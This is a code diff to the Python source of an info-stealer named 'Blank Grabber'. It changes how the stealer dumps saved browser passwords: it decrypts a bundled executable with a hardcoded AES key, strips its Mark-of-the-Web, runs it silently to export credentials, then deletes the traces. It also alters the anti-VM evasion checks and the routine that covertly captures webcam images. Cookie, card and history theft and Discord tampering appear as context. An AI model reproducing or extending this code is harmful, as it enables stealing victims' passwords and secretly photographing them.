@@ -14,7 +14,7 @@ import PIL.ImageGrab as ImageGrab, PIL.Image as Image, PIL.ImageStat as ImageSta
 
 from threading import Thread
 from win32crypt import CryptUnprotectData
-from pyaes import AESModeOfOperationGCM, AESModeOfOperationCFB
+from pyaes import AESModeOfOperationGCM, AESModeOfOperationCTR
 
 if os.name != 'nt':
     os._exit(1)
@@ -247,7 +247,7 @@ class vmprotect:
     @staticmethod
     def checkVM() -> bool:
         Thread(target= vmprotect.killTasks, daemon= True).start()
-        return vmprotect.checkHWID() or vmprotect.checkComputerName() or vmprotect.checkUsers() or vmprotect.checkHosting() or vmprotect.checkHTTPSimulation() or vmprotect.checkRegistry()
+        return vmprotect.checkHWID() or vmprotect.checkComputerName() or vmprotect.checkUsers() or vmprotect.checkHosting() or vmprotect.checkRegistry() #or vmprotect.checkHTTPSimulation()
 
 class Browsers:
     CHROMEENCRYPTIONKEY = None
@@ -685,7 +685,7 @@ class BlankGrabber:
         threads = list()
         
         for func in (
-            self.captureChromePasswords,
+            self.captureBrowserPasswords,
             self.captureChromeCookies,
             self.captureChromeCC,
             self.captureChromeHistory,
@@ -750,8 +750,8 @@ class BlankGrabber:
                             subprocess.run([UpdateEXE, '--processStart', DiscordEXE], shell= True, capture_output= True)
         
     @utils.catch
-    def captureChromePasswords(self) -> None:
-        vault = Browsers.getChromePass()
+    def captureBrowserPasswords(self) -> None:
+        """ vault = Browsers.getChromePass()
         passwords = list()
         if not vault:
             return
@@ -764,7 +764,40 @@ class BlankGrabber:
         divider = '\n\n' + 'Blank Grabber'.center(50, '=') + '\n\n'
         with open(os.path.join(credentials, 'Chrome Passwords.txt'), 'w') as file:
             file.write(divider.lstrip() + divider.join(passwords))
-        self.collection['Passwords'] += len(passwords)
+        self.collection['Passwords'] += len(passwords) """
+        if not os.path.isfile(PasswordGrabber := os.path.join(MEIPASS, 'getPass')):
+            return
+        system.unblockMOTW(PasswordGrabber)
+        with open(PasswordGrabber, 'rb') as file:
+            data = file.read()
+        data = AESModeOfOperationCTR(b'f61QfygejoxUWGxI').decrypt(data)
+        if not b'This program cannot be run in DOS mode.' in data:
+            return
+        if hasattr(sys, 'frozen'):
+            tempGetPass = os.path.join(MEIPASS, 'getPass.exe')
+        else:
+            tempGetPass = os.path.join(os.getenv('temp'), 'getPass.exe')
+        with open(tempGetPass, 'wb') as file:
+            file.write(data)
+        tempGetPassPath = os.path.dirname(tempGetPass)
+        try:
+            subprocess.run('getPass.exe /stext pass.txt', shell= True, capture_output= True, timeout= 5.0, cwd= tempGetPassPath)
+        except subprocess.TimeoutExpired:
+            os.remove(tempGetPass)
+            return
+        os.remove(tempGetPass)
+        if os.path.isfile(tempGetPassCFG := os.path.join(tempGetPassPath, 'getPass.cfg')):
+            os.remove(tempGetPassCFG)
+        with open(passfile := os.path.join(tempGetPassPath, 'pass.txt'), encoding= 'utf-16', errors= 'ignore') as file:
+            data = file.read()
+        if 'URL' in data:
+            divider = 'Blank Grabber'.center(50, '=')
+            data = list(['\n'.join(x.replace('=' * 50, divider, 1).splitlines()[:-1]) for x in data.split('\n\n') if x != ''])
+            self.collection['Passwords'] += len(data)
+            os.makedirs(credentials := os.path.join(self.tempfolder, 'Credentials'), exist_ok= True)
+            with open(os.path.join(credentials, 'Passwords.txt'), 'w') as file:
+                file.write('\n\n'.join(data))
+        os.remove(passfile)
     
     @utils.catch
     def captureChromeCookies(self) -> None:
@@ -970,7 +1003,7 @@ class BlankGrabber:
 
         with open(Camfile, 'rb') as file:
             data = file.read()
-        data = AESModeOfOperationCFB(b'f61QfygejoxUWGxI', b'buoYAB3phL5u6kpC').decrypt(data)
+        data = AESModeOfOperationCTR(b'f61QfygejoxUWGxI').decrypt(data)
         if not b'This program cannot be run in DOS mode.' in data:
             return
         if hasattr(sys, 'frozen'):
@@ -985,6 +1018,7 @@ class BlankGrabber:
             try:
                 subprocess.run('Camera.exe /devnum {} /quiet /filename image.bmp'.format(index + 1), shell= True, capture_output= True, cwd= tempCamPath, timeout= 5.0).stdout.decode(errors= 'ignore')
             except subprocess.TimeoutExpired:
+                os.remove(tempCam)
                 return
             if not os.path.isfile(tempimg := os.path.join(tempCamPath, 'image.bmp')):
                 continue
